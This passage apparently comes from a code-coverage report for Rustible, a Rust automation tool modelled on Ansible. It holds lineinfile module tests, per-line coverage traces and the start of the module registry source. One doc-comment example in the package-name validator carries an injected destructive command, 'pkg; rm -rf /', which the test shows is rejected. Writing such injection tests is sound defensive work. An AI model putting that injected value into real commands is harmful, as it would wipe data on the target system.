assert!(!content.contains(\"line2\"));\n    }\n\n    #[test]\n    fn test_lineinfile_insertafter() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\u0026path, \"line1\\nline2\\nline3\\n\").unwrap();\n\n        let module = LineinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"line\".to_string(), serde_json::json!(\"new_line\"));\n        params.insert(\"insertafter\".to_string(), serde_json::json!(\"^line1\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let lines: Vec\u003c_\u003e = fs::read_to_string(\u0026path)\n            .unwrap()\n            .lines()\n            .map(String::from)\n            .collect();\n        assert_eq!(lines[1], \"new_line\");\n    }\n\n    #[test]\n    fn test_lineinfile_insertbefore() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\u0026path, \"line1\\nline2\\nline3\\n\").unwrap();\n\n        let module = LineinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"line\".to_string(), serde_json::json!(\"new_line\"));\n        params.insert(\"insertbefore\".to_string(), serde_json::json!(\"^line3\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let lines: Vec\u003c_\u003e = fs::read_to_string(\u0026path)\n            .unwrap()\n            .lines()\n            .map(String::from)\n            .collect();\n        assert_eq!(lines[2], \"new_line\");\n    }\n\n    #[test]\n    fn test_lineinfile_create() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"new_file.txt\");\n\n        let module = LineinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"line\".to_string(), serde_json::json!(\"new_line\"));\n        params.insert(\"create\".to_string(), serde_json::json!(true));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(path.exists());\n        let content = fs::read_to_string(\u0026path).unwrap();\n        assert!(content.contains(\"new_line\"));\n    }\n\n    #[test]\n    fn test_lineinfile_check_mode() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\u0026path, \"line1\\nline2\\n\").unwrap();\n\n        let module = LineinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"line\".to_string(), serde_json::json!(\"line3\"));\n\n        let context = ModuleContext::default().with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.msg.contains(\"Would modify\"));\n\n        // File should not be modified\n        let content = fs::read_to_string(\u0026path).unwrap();\n        assert!(!content.contains(\"line3\"));\n    }\n\n    #[test]\n    fn test_lineinfile_regexp_absent() {\n        let temp = TempDir::new().unwrap();\n        let path = temp.path().join(\"test.txt\");\n        fs::write(\u0026path, \"# comment1\\nkey=value\\n# comment2\\n\").unwrap();\n\n        let module = LineinfileModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"path\".to_string(),\n            serde_json::json!(path.to_str().unwrap()),\n        );\n        params.insert(\"regexp\".to_string(), serde_json::json!(\"^#\"));\n        params.insert(\"state\".to_string(), serde_json::json!(\"absent\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        let content = fs::read_to_string(\u0026path).unwrap();\n        assert!(!content.contains(\"#\"));\n        assert!(content.contains(\"key=value\"));\n    }\n}\n","traces":[{"line":28,"address":[31248953,31248959,31248416],"length":1,"stats":{"Line":1}},{"line":29,"address":[31248443,31248545],"length":1,"stats":{"Line":2}},{"line":30,"address":[31248632,31248561],"length":1,"stats":{"Line":2}},{"line":31,"address":[31248701,31248658,31248604],"length":1,"stats":{"Line":3}},{"line":32,"address":[31248723,31248669],"length":1,"stats":{"Line":0}},{"line":57,"address":[31248397,31247888,31248403],"length":1,"stats":{"Line":1}},{"line":58,"address":[31247947],"length":1,"stats":{"Line":1}},{"line":59,"address":[31247956],"length":1,"stats":{"Line":1}},{"line":62,"address":[31248024,31248111],"length":1,"stats":{"Line":1}},{"line":63,"address":[26735888,26735941],"length":1,"stats":{"Line":4}},{"line":66,"address":[31232549,31232555,31231504],"length":1,"stats":{"Line":1}},{"line":72,"address":[31231629],"length":1,"stats":{"Line":1}},{"line":73,"address":[31231751],"length":1,"stats":{"Line":0}},{"line":75,"address":[31231730],"length":1,"stats":{"Line":0}},{"line":80,"address":[31231658,31232000],"length":1,"stats":{"Line":2}},{"line":81,"address":[31232042],"length":1,"stats":{"Line":1}},{"line":82,"address":[31232088],"length":1,"stats":{"Line":0}},{"line":86,"address":[31232063],"length":1,"stats":{"Line":1}},{"line":87,"address":[31232257],"length":1,"stats":{"Line":0}},{"line":89,"address":[31232275,31232190],"length":1,"stats":{"Line":1}},{"line":92,"address":[31232573,31232438],"length":1,"stats":{"Line":1}},{"line":94,"address":[31232606],"length":1,"stats":{"Line":1}},{"line":95,"address":[31232727,31232629],"length":1,"stats":{"Line":0}},{"line":98,"address":[31232704],"length":1,"stats":{"Line":1}},{"line":101,"address":[31233523,31232768,31233517],"length":1,"stats":{"Line":0}},{"line":102,"address":[31233496,31232837,31232918],"length":1,"stats":{"Line":0}},{"line":103,"address":[31232933],"length":1,"stats":{"Line":0}},{"line":104,"address":[31233239,31233158],"length":1,"stats":{"Line":0}},{"line":105,"address":[31233357],"length":1,"stats":{"Line":0}},{"line":107,"address":[31232851],"length":1,"stats":{"Line":0}},{"line":111,"address":[31245680,31246812,31246848],"length":1,"stats":{"Line":1}},{"line":116,"address":[31245775],"length":1,"stats":{"Line":1}},{"line":117,"address":[31246010,31245854],"length":1,"stats":{"Line":2}},{"line":118,"address":[31246121,31246032],"length":1,"stats":{"Line":1}},{"line":119,"address":[31246087,31246210,31246259],"length":1,"stats":{"Line":2}},{"line":121,"address":[26735216,26735460],"length":1,"stats":{"Line":2}},{"line":122,"address":[26735306,26735238],"length":1,"stats":{"Line":0}},{"line":124,"address":[26735552,26735579],"length":1,"stats":{"Line":4}},{"line":125,"address":[31246716],"length":1,"stats":{"Line":1}},{"line":128,"address":[31246796,31245910,31246818,31246861,31247035],"length":1,"stats":{"Line":4}},{"line":129,"address":[31246903,31247094],"length":1,"stats":{"Line":2}},{"line":130,"address":[31247110,31247184],"length":1,"stats":{"Line":1}},{"line":131,"address":[31247270,31247313,31247153],"length":1,"stats":{"Line":2}},{"line":133,"address":[31247286,31247411,31247495],"length":1,"stats":{"Line":2}},{"line":134,"address":[26735706,26735638],"length":1,"stats":{"Line":0}},{"line":136,"address":[31247675,31247600],"length":1,"stats":{"Line":4}},{"line":137,"address":[31247758],"length":1,"stats":{"Line":1}},{"line":141,"address":[31246958],"length":1,"stats":{"Line":1}},{"line":145,"address":[31243200,31244938,31244623],"length":1,"stats":{"Line":1}},{"line":154,"address":[26735182,26735168],"length":1,"stats":{"Line":3}},{"line":156,"address":[31243506],"length":1,"stats":{"Line":1}},{"line":157,"address":[26735091,26735072],"length":1,"stats":{"Line":0}},{"line":158,"address":[31243685],"length":1,"stats":{"Line":0}},{"line":161,"address":[31243655],"length":1,"stats":{"Line":1}},{"line":166,"address":[31243715,31243466],"length":1,"stats":{"Line":2}},{"line":167,"address":[31243736],"length":1,"stats":{"Line":1}},{"line":170,"address":[26734976,26734990],"length":1,"stats":{"Line":3}},{"line":171,"address":[26735058,26735040],"length":1,"stats":{"Line":3}},{"line":174,"address":[31243864,31244069],"length":1,"stats":{"Line":2}},{"line":175,"address":[31244082,31244895],"length":1,"stats":{"Line":1}},{"line":177,"address":[31244672,31244769,31244629,31244136,31244916],"length":1,"stats":{"Line":0}},{"line":180,"address":[31244107,31244184,31244596],"length":1,"stats":{"Line":3}},{"line":181,"address":[31244473,31244292,31244384,31244411,31244601],"length":1,"stats":{"Line":2}},{"line":184,"address":[31244335],"length":1,"stats":{"Line":1}},{"line":189,"address":[31244959,31243893],"length":1,"stats":{"Line":1}},{"line":191,"address":[31245144],"length":1,"stats":{"Line":1}},{"line":193,"address":[31245201],"length":1,"stats":{"Line":0}},{"line":196,"address":[31245269],"length":1,"stats":{"Line":1}},{"line":199,"address":[31245155,31245326],"length":1,"stats":{"Line":2}},{"line":200,"address":[31245415,31245342],"length":1,"stats":{"Line":2}},{"line":203,"address":[31245361],"length":1,"stats":{"Line":0}},{"line":207,"address":[31245178,31245524],"length":1,"stats":{"Line":2}},{"line":208,"address":[31245545],"length":1,"stats":{"Line":1}},{"line":211,"address":[31245611],"length":1,"stats":{"Line":0}},{"line":216,"address":[31245502],"length":1,"stats":{"Line":1}},{"line":219,"address":[31243056],"length":1,"stats":{"Line":1}},{"line":224,"address":[31243101],"length":1,"stats":{"Line":1}},{"line":226,"address":[26734768],"length":1,"stats":{"Line":2}},{"line":227,"address":[26734868,26734787],"length":1,"stats":{"Line":2}},{"line":228,"address":[26734837],"length":1,"stats":{"Line":1}},{"line":229,"address":[26734923,26734973,26734875],"length":1,"stats":{"Line":2}},{"line":230,"address":[26734944],"length":1,"stats":{"Line":1}},{"line":232,"address":[26734968],"length":1,"stats":{"Line":0}},{"line":236,"address":[31243140],"length":1,"stats":{"Line":1}},{"line":239,"address":[31241188,31240016,31241194],"length":1,"stats":{"Line":0}},{"line":240,"address":[31240142],"length":1,"stats":{"Line":0}},{"line":241,"address":[31240276],"length":1,"stats":{"Line":0}},{"line":244,"address":[31240437,31240379],"length":1,"stats":{"Line":0}},{"line":245,"address":[31240573,31240677],"length":1,"stats":{"Line":0}},{"line":246,"address":[31241059,31240752],"length":1,"stats":{"Line":0}},{"line":250,"address":[31240612],"length":1,"stats":{"Line":0}},{"line":252,"address":[31240316],"length":1,"stats":{"Line":0}},{"line":262,"address":[31241216,31242703,31243012],"length":1,"stats":{"Line":0}},{"line":277,"address":[31241667,31241771,31242727,31241508],"length":1,"stats":{"Line":0}},{"line":278,"address":[26733694],"length":1,"stats":{"Line":0}},{"line":282,"address":[26722144,26722399,26722393],"length":1,"stats":{"Line":0}},{"line":283,"address":[26722239,26722171],"length":1,"stats":{"Line":0}},{"line":286,"address":[31242273,31242137],"length":1,"stats":{"Line":0}},{"line":287,"address":[31242294],"length":1,"stats":{"Line":0}},{"line":288,"address":[31242309],"length":1,"stats":{"Line":0}},{"line":290,"address":[26722720,26723971,26732786,26722699,26722635,26723020,26722416,26722479,26722678],"length":1,"stats":{"Line":0}},{"line":291,"address":[26722817,26722528],"length":1,"stats":{"Line":0}},{"line":294,"address":[25985983],"length":1,"stats":{"Line":0}},{"line":296,"address":[26723333],"length":1,"stats":{"Line":0}},{"line":297,"address":[26723393],"length":1,"stats":{"Line":0}},{"line":304,"address":[26724439,26723367],"length":1,"stats":{"Line":0}},{"line":305,"address":[26734288,26734523,26722686,26723728,26723985,26724305,26728821,26723826],"length":1,"stats":{"Line":0}},{"line":306,"address":[26734370,26734310],"length":1,"stats":{"Line":0}},{"line":309,"address":[26723755,26723702],"length":1,"stats":{"Line":0}},{"line":313,"address":[26724519,26723765],"length":1,"stats":{"Line":0}},{"line":314,"address":[26724545,26734544,26724654,26734597],"length":1,"stats":{"Line":0}},{"line":315,"address":[26724722],"length":1,"stats":{"Line":0}},{"line":318,"address":[26724809],"length":1,"stats":{"Line":0}},{"line":320,"address":[26734672,26724985,26724895,26726507,26725084],"length":1,"stats":{"Line":0}},{"line":321,"address":[26734719],"length":1,"stats":{"Line":0}},{"line":322,"address":[26734686],"length":1,"stats":{"Line":0}},{"line":327,"address":[26725149],"length":1,"stats":{"Line":0}},{"line":328,"address":[26725291,26725193],"length":1,"stats":{"Line":0}},{"line":330,"address":[26725396,26734624,26725316,26734638],"length":1,"stats":{"Line":0}},{"line":331,"address":[26725502],"length":1,"stats":{"Line":0}},{"line":332,"address":[26725565,26725667],"length":1,"stats":{"Line":0}},{"line":335,"address":[26725596,26725750],"length":1,"stats":{"Line":0}},{"line":341,"address":[26725358,26725928],"length":1,"stats":{"Line":0}},{"line":344,"address":[26725225,26725166],"length":1,"stats":{"Line":0}},{"line":347,"address":[26726228,26726352],"length":1,"stats":{"Line":0}},{"line":348,"address":[26725235],"length":1,"stats":{"Line":0}},{"line":349,"address":[26725257],"length":1,"stats":{"Line":0}},{"line":350,"address":[26726017],"length":1,"stats":{"Line":0}},{"line":351,"address":[26726047],"length":1,"stats":{"Line":0}},{"line":352,"address":[26726118],"length":1,"stats":{"Line":0}},{"line":353,"address":[26726221],"length":1,"stats":{"Line":0}},{"line":357,"address":[26726552,26728816,26724836],"length":1,"stats":{"Line":0}},{"line":361,"address":[26726422],"length":1,"stats":{"Line":0}},{"line":362,"address":[26726787,26726844],"length":1,"stats":{"Line":0}},{"line":369,"address":[26726826],"length":1,"stats":{"Line":0}},{"line":370,"address":[26727025,26727786,26728254],"length":1,"stats":{"Line":0}},{"line":371,"address":[26728777,26727796,26727872,26727955,26728132],"length":1,"stats":{"Line":0}},{"line":373,"address":[26727760],"length":1,"stats":{"Line":0}},{"line":376,"address":[26728325,26727838],"length":1,"stats":{"Line":0}},{"line":378,"address":[26728448,26728737],"length":1,"stats":{"Line":0}},{"line":379,"address":[26728613,26728711],"length":1,"stats":{"Line":0}},{"line":382,"address":[26728646],"length":1,"stats":{"Line":0}},{"line":386,"address":[26727006,26727087],"length":1,"stats":{"Line":0}},{"line":387,"address":[26727104],"length":1,"stats":{"Line":0}},{"line":388,"address":[26727413,26727304],"length":1,"stats":{"Line":0}},{"line":390,"address":[26727713,26729154,26727451,26728993,26729078],"length":1,"stats":{"Line":0}},{"line":391,"address":[25986027],"length":1,"stats":{"Line":0}},{"line":392,"address":[26734032,26734267,26729055],"length":1,"stats":{"Line":0}},{"line":393,"address":[26734114,26734054],"length":1,"stats":{"Line":0}},{"line":398,"address":[26727051,26729223],"length":1,"stats":{"Line":0}},{"line":399,"address":[26729279,26729566],"length":1,"stats":{"Line":0}},{"line":401,"address":[26729237,26729312],"length":1,"stats":{"Line":0}},{"line":405,"address":[26729559],"length":1,"stats":{"Line":0}},{"line":406,"address":[26729634,26729958],"length":1,"stats":{"Line":0}},{"line":407,"address":[26729925,26729670],"length":1,"stats":{"Line":0}},{"line":409,"address":[26729971,26729775],"length":1,"stats":{"Line":0}},{"line":412,"address":[26730634,26730042,26730400,26730719,26730795],"length":1,"stats":{"Line":0}},{"line":413,"address":[25986049],"length":1,"stats":{"Line":0}},{"line":414,"address":[26730696,26733776,26734011],"length":1,"stats":{"Line":0}},{"line":415,"address":[26733798,26733858],"length":1,"stats":{"Line":0}},{"line":418,"address":[26730902,26730836],"length":1,"stats":{"Line":0}},{"line":420,"address":[26731636,26731041],"length":1,"stats":{"Line":0}},{"line":421,"address":[26731248,26731553,26731426,26732944,26731158,26731076],"length":1,"stats":{"Line":0}},{"line":424,"address":[26731771,26731058],"length":1,"stats":{"Line":0}},{"line":425,"address":[26731784,26732165,26732224],"length":1,"stats":{"Line":0}},{"line":427,"address":[26731928,26731838,26732131],"length":1,"stats":{"Line":0}},{"line":431,"address":[26731641],"length":1,"stats":{"Line":0}},{"line":437,"address":[31236280,31233536,31239996],"length":1,"stats":{"Line":1}},{"line":452,"address":[31233863,31234022],"length":1,"stats":{"Line":2}},{"line":455,"address":[31234060],"length":1,"stats":{"Line":1}},{"line":456,"address":[31234142],"length":1,"stats":{"Line":0}},{"line":463,"address":[31239919,31234442,31234124],"length":1,"stats":{"Line":2}},{"line":464,"address":[31234615],"length":1,"stats":{"Line":1}},{"line":467,"address":[31234693],"length":1,"stats":{"Line":1}},{"line":469,"address":[26722048],"length":1,"stats":{"Line":2}},{"line":470,"address":[26722062],"length":1,"stats":{"Line":0}},{"line":474,"address":[31234994],"length":1,"stats":{"Line":1}},{"line":475,"address":[31235033,31235105],"length":1,"stats":{"Line":0}},{"line":477,"address":[26722000,26722014],"length":1,"stats":{"Line":0}},{"line":478,"address":[31235300],"length":1,"stats":{"Line":0}},{"line":479,"address":[31235363,31235461],"length":1,"stats":{"Line":0}},{"line":482,"address":[31235394,31235544],"length":1,"stats":{"Line":0}},{"line":488,"address":[31235156,31235715],"length":1,"stats":{"Line":0}},{"line":491,"address":[31235006,31235061],"length":1,"stats":{"Line":2}},{"line":496,"address":[31235071],"length":1,"stats":{"Line":1}},{"line":497,"address":[31235804],"length":1,"stats":{"Line":1}},{"line":498,"address":[31235827],"length":1,"stats":{"Line":1}},{"line":499,"address":[31235894],"length":1,"stats":{"Line":1}},{"line":504,"address":[31236331,31239892,31234714],"length":1,"stats":{"Line":2}},{"line":508,"address":[31236195],"length":1,"stats":{"Line":1}},{"line":509,"address":[31236559,31236612],"length":1,"stats":{"Line":2}},{"line":516,"address":[31236594],"length":1,"stats":{"Line":1}},{"line":517,"address":[31236787,31239047,31239359],"length":1,"stats":{"Line":2}},{"line":518,"address":[31239870,31239049,31239126],"length":1,"stats":{"Line":0}},{"line":520,"address":[31239021],"length":1,"stats":{"Line":1}},{"line":523,"address":[31239086,31239430],"length":1,"stats":{"Line":2}},{"line":525,"address":[31239553,31239836],"length":1,"stats":{"Line":1}},{"line":526,"address":[31239810,31239715],"length":1,"stats":{"Line":0}},{"line":529,"address":[31239745],"length":1,"stats":{"Line":1}},{"line":533,"address":[31236773,31236831,31237178],"length":1,"stats":{"Line":2}},{"line":534,"address":[31236942,31239019,31236841],"length":1,"stats":{"Line":0}},{"line":536,"address":[31236805],"length":1,"stats":{"Line":1}},{"line":540,"address":[31236864,31237304],"length":1,"stats":{"Line":2}},{"line":542,"address":[31237470],"length":1,"stats":{"Line":1}},{"line":544,"address":[31237628],"length":1,"stats":{"Line":1}},{"line":545,"address":[31237804,31237705,31238066],"length":1,"stats":{"Line":0}},{"line":548,"address":[31238601,31237786],"length":1,"stats":{"Line":1}},{"line":549,"address":[31238893,31238195],"length":1,"stats":{"Line":0}},{"line":552,"address":[31238073],"length":1,"stats":{"Line":1}},{"line":557,"address":[31254848],"length":1,"stats":{"Line":0}},{"line":561,"address":[31248976],"length":1,"stats":{"Line":0}},{"line":565,"address":[31249008],"length":1,"stats":{"Line":0}},{"line":569,"address":[31249024],"length":1,"stats":{"Line":0}},{"line":573,"address":[31249056,31250148,31250142],"length":1,"stats":{"Line":0}},{"line":574,"address":[31249127,31249254],"length":1,"stats":{"Line":0}},{"line":576,"address":[26736028,26736016],"length":1,"stats":{"Line":0}},{"line":578,"address":[31249409,31249346],"length":1,"stats":{"Line":0}},{"line":579,"address":[31249849,31249443],"length":1,"stats":{"Line":0}},{"line":580,"address":[31250024],"length":1,"stats":{"Line":0}},{"line":581,"address":[31249975],"length":1,"stats":{"Line":0}},{"line":584,"address":[31249415,31249478],"length":1,"stats":{"Line":0}},{"line":585,"address":[31249523],"length":1,"stats":{"Line":0}},{"line":586,"address":[31249715],"length":1,"stats":{"Line":0}},{"line":587,"address":[31249679],"length":1,"stats":{"Line":0}},{"line":592,"address":[31249489],"length":1,"stats":{"Line":0}},{"line":595,"address":[31259491,31259752,31255312],"length":1,"stats":{"Line":1}},{"line":600,"address":[31255390],"length":1,"stats":{"Line":1}},{"line":601,"address":[31255769,31259750,31255853],"length":1,"stats":{"Line":1}},{"line":603,"address":[26736668,26736656],"length":1,"stats":{"Line":3}},{"line":604,"address":[31256039,31259729,31255948],"length":1,"stats":{"Line":2}},{"line":605,"address":[31256200,31259708],"length":1,"stats":{"Line":1}},{"line":606,"address":[31259674,31256516,31256432],"length":1,"stats":{"Line":2}},{"line":607,"address":[31256784,31259653,31256697],"length":1,"stats":{"Line":2}},{"line":608,"address":[31259602,31256973,31257057],"length":1,"stats":{"Line":2}},{"line":609,"address":[31257330,31257246],"length":1,"stats":{"Line":2}},{"line":610,"address":[31257339],"length":1,"stats":{"Line":1}},{"line":611,"address":[31257518,31259551,31257434],"length":1,"stats":{"Line":1}},{"line":613,"address":[31257575],"length":1,"stats":{"Line":3}},{"line":614,"address":[31257621,31257705],"length":1,"stats":{"Line":2}},{"line":615,"address":[31257714],"length":1,"stats":{"Line":1}},{"line":616,"address":[31259497,31257766],"length":1,"stats":{"Line":1}},{"line":619,"address":[31257960,31258056],"length":1,"stats":{"Line":2}},{"line":621,"address":[31258135,31258196,31258013,31258077],"length":1,"stats":{"Line":3}},{"line":622,"address":[31258112,31258164],"length":1,"stats":{"Line":1}},{"line":625,"address":[31258036],"length":1,"stats":{"Line":1}},{"line":629,"address":[31258464,31258365],"length":1,"stats":{"Line":2}},{"line":633,"address":[31258506],"length":1,"stats":{"Line":0}},{"line":635,"address":[31259075],"length":1,"stats":{"Line":0}},{"line":636,"address":[31259115],"length":1,"stats":{"Line":0}},{"line":637,"address":[31259155],"length":1,"stats":{"Line":0}},{"line":638,"address":[31259195],"length":1,"stats":{"Line":0}},{"line":641,"address":[31259235],"length":1,"stats":{"Line":0}},{"line":650,"address":[31258478],"length":1,"stats":{"Line":1}},{"line":652,"address":[31258608],"length":1,"stats":{"Line":1}},{"line":653,"address":[31258648],"length":1,"stats":{"Line":1}},{"line":654,"address":[31258688],"length":1,"stats":{"Line":1}},{"line":655,"address":[31258728],"length":1,"stats":{"Line":1}},{"line":658,"address":[31258768],"length":1,"stats":{"Line":1}},{"line":666,"address":[31254880,31255280,31255286],"length":1,"stats":{"Line":1}},{"line":671,"address":[31255216],"length":1,"stats":{"Line":1}},{"line":674,"address":[31253727,31254820,31250176],"length":1,"stats":{"Line":0}},{"line":675,"address":[31250242],"length":1,"stats":{"Line":0}},{"line":676,"address":[31250502,31250605],"length":1,"stats":{"Line":0}},{"line":677,"address":[31250770,31254818,31250686],"length":1,"stats":{"Line":0}},{"line":679,"address":[26736064,26736076],"length":1,"stats":{"Line":0}},{"line":680,"address":[31254797,31250956,31250865],"length":1,"stats":{"Line":0}},{"line":681,"address":[31251117,31254776],"length":1,"stats":{"Line":0}},{"line":682,"address":[31254699,31251349,31251458],"length":1,"stats":{"Line":0}},{"line":683,"address":[31254658,31251726,31251639],"length":1,"stats":{"Line":0}},{"line":684,"address":[31254637,31251994,31251907],"length":1,"stats":{"Line":0}},{"line":685,"address":[31252175,31252254],"length":1,"stats":{"Line":0}},{"line":687,"address":[31252263,31252351],"length":1,"stats":{"Line":0}},{"line":689,"address":[31252316,31252372,31252430,31252675,31252491],"length":1,"stats":{"Line":0}},{"line":690,"address":[26736134,26736112],"length":1,"stats":{"Line":0}},{"line":693,"address":[31252339],"length":1,"stats":{"Line":0}},{"line":696,"address":[31252755,31252668,31254616],"length":1,"stats":{"Line":0}},{"line":697,"address":[31252928],"length":1,"stats":{"Line":0}},{"line":699,"address":[31253006],"length":1,"stats":{"Line":0}},{"line":701,"address":[31253173,31253057],"length":1,"stats":{"Line":0}},{"line":704,"address":[31253142],"length":1,"stats":{"Line":0}},{"line":705,"address":[31253262],"length":1,"stats":{"Line":0}},{"line":706,"address":[31253277],"length":1,"stats":{"Line":0}},{"line":707,"address":[31253332],"length":1,"stats":{"Line":0}},{"line":711,"address":[31253165],"length":1,"stats":{"Line":0}},{"line":715,"address":[31253019,31253767,31254574],"length":1,"stats":{"Line":0}},{"line":719,"address":[31253667,31254333,31254019],"length":1,"stats":{"Line":0}},{"line":720,"address":[31254082,31254021,31254552,31254151],"length":1,"stats":{"Line":0}},{"line":722,"address":[31253983],"length":1,"stats":{"Line":0}}],"covered":121,"coverable":288},{"path":["/","home","artur","Repositories","rustible","src","modules","mod.rs"],"content":"//! Module system for Rustible\n//!\n//! This module provides the core traits, types, and registry for the Rustible module system.\n//! Modules are the building blocks that perform actual work on target systems.\n\npub mod apt;\npub mod assert;\npub mod blockinfile;\npub mod command;\npub mod copy;\npub mod debug;\npub mod dnf;\n// TODO: facts module needs to be converted to sync Module trait\n// pub mod facts;\npub mod file;\npub mod git;\npub mod group;\npub mod lineinfile;\npub mod package;\npub mod pip;\npub mod python;\npub mod service;\npub mod set_fact;\npub mod shell;\npub mod stat;\npub mod template;\npub mod user;\npub mod yum;\n\npub use python::PythonModuleExecutor;\n\nuse crate::connection::Connection;\nuse once_cell::sync::Lazy;\nuse regex::Regex;\nuse serde::{Deserialize, Serialize};\nuse std::collections::HashMap;\nuse std::fmt;\nuse std::sync::Arc;\nuse thiserror::Error;\n\n/// Regex pattern for validating package names.\n/// Allows alphanumeric characters, dots, underscores, plus signs, and hyphens.\nstatic PACKAGE_NAME_REGEX: Lazy\u003cRegex\u003e =\n    Lazy::new(|| Regex::new(r\"^[a-zA-Z0-9._+-]+$\").expect(\"Invalid package name regex\"));\n\n/// Validates a package name against a safe regex pattern.\n///\n/// Package names must only contain alphanumeric characters, dots, underscores,\n/// plus signs, and hyphens (`[a-zA-Z0-9._+-]+`). This prevents command injection\n/// attacks when package names are passed to shell commands.\n///\n/// # Arguments\n///\n/// * `name` - The package name to validate\n///\n/// # Returns\n///\n/// * `Ok(())` if the package name is valid\n/// * `Err(ModuleError::InvalidParameter)` if the package name contains invalid characters\n///\n/// # Examples\n///\n/// ```\n/// use rustible::modules::validate_package_name;\n///\n/// assert!(validate_package_name(\"nginx\").is_ok());\n/// assert!(validate_package_name(\"python3.11\").is_ok());\n/// assert!(validate_package_name(\"g++\").is_ok());\n/// assert!(validate_package_name(\"lib-dev\").is_ok());\n///\n/// // Invalid package names\n/// assert!(validate_package_name(\"pkg; rm -rf /\").is_err());\n/// assert!(validate_package_name(\"\").is_err());\n/// ```\npub fn validate_package_name(name: \u0026str) -\u003e ModuleResult\u003c()\u003e {\n    if name.is_empty() {\n        return Err(ModuleError::InvalidParameter(\n            \"Package name cannot be empty\".to_string(),\n        ));\n    }\n\n    if !PACKAGE_NAME_REGEX.is_match(name) {\n        return Err(ModuleError::InvalidParameter(format!(\n            \"Invalid package name '{}': must contain only alphanumeric characters, dots, underscores, plus signs, and hyphens\",\n            name\n        )));\n    }\n\n    Ok(())\n}\n\n/// Errors that can occur during module execution\n#[derive(Error, Debug)]\npub enum ModuleError {\n    #[error(\"Module not found: {0}\")]\n    NotFound(String),\n\n    #[error(\"Invalid parameter: {0}\")]\n    InvalidParameter(String),\n\n    #[error(\"Missing required parameter: {0}\")]\n    MissingParameter(String),\n\n    #[error(\"Execution failed: {0}\")]\n    ExecutionFailed(String),\n\n    #[error(\"IO error: {0}\")]\n    Io(#[from] std::io::Error),\n\n    #[error(\"Permission denied: {0}\")]\n    PermissionDenied(String),\n\n    #[error(\"Command failed with exit code {code}: {message}\")]\n    CommandFailed { code: i32, message: String },\n\n    #[error(\"Template error: {0}\")]\n    TemplateError(String),\n\n    #[error(\"Parse error: {0}\")]\n    ParseError(String),\n\n    #[error(\"Unsupported operation: {0}\")]\n    Unsupported(String),\n\n    #[error(\"Ansible module not found: {0}\")]\n    ModuleNotFound(String),\n}\n\n/// Result type for module operations\npub type ModuleResult\u003cT\u003e = Result\u003cT, ModuleError\u003e;\n\n/// Status of a module execution\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]\n#[serde(rename_all = \"lowercase\")]\npub enum ModuleStatus {\n    /// Module executed successfully and made changes\n    Changed,\n    /// Module executed successfully but no changes were needed\n    Ok,\n    /// Module execution failed\n    Failed,\n    /// Module was skipped (e.g., condition not met)\n    Skipped,\n}\n\nimpl fmt::Display for ModuleStatus {\n    fn fmt(\u0026self, f: \u0026mut fmt::Formatter\u003c'_\u003e) -\u003e fmt::Result {\n        match self {\n            ModuleStatus::Changed =\u003e write!(f, \"changed\"),\n            ModuleStatus::Ok =\u003e write!(f, \"ok\"),\n            ModuleStatus::Failed =\u003e write!(f, \"failed\"),\n            ModuleStatus::Skipped =\u003e write!(f, \"skipped\"),\n        }\n    }\n}\n\n/// Classification of modules based on their execution characteristics.\n///\n/// This enables intelligent parallelization and backwards compatibility with\n/// Ansible modules by categorizing how each module executes.\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]\n#[serde(rename_all = \"snake_case\")]\npub enum ModuleClassification {\n    /// Tier 1: Logic modules that run entirely on the control node.\n    /// Examples: debug, set_fact, assert, fail, meta, include_tasks\n    /// These never touch the remote host and execute in nanoseconds.\n    LocalLogic,\n\n    /// Tier 2: File/transport modules implemented natively in Rust.\n    /// Examples: copy, template, file, lineinfile, fetch\n    /// These use direct SSH/SFTP operations without remote Python.\n    NativeTransport,\n\n    /// Tier 3: Remote command execution modules.\n    /// Examples: command, shell, service, package, user\n    /// These execute commands on the remote host via SSH.\n    #[default]\n    RemoteCommand,\n\n    /// Tier 4: Python fallback for Ansible module compatibility.\n    /// Used for any module without a native Rust implementation.\n    /// Executes via AnsiballZ-compatible Python wrapper.\n    PythonFallback,\n}\n\nimpl fmt::Display for ModuleClassification {\n    fn fmt(\u0026self, f: \u0026mut fmt::Formatter\u003c'_\u003e) -\u003e fmt::Result {\n        match self {\n            ModuleClassification::LocalLogic =\u003e write!(f, \"local_logic\"),\n            ModuleClassification::NativeTransport =\u003e write!(f, \"native_transport\"),\n            ModuleClassification::RemoteCommand =\u003e write!(f, \"remote_command\"),\n            ModuleClassification::PythonFallback =\u003e write!(f, \"python_fallback\"),\n        }\n    }\n}\n\n/// Hints for how a module can be parallelized across hosts.\n///\n/// The executor uses these hints to determine safe concurrency levels\n/// and prevent race conditions or resource contention.\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]\n#[serde(rename_all = \"snake_case\")]\npub enum ParallelizationHint {\n    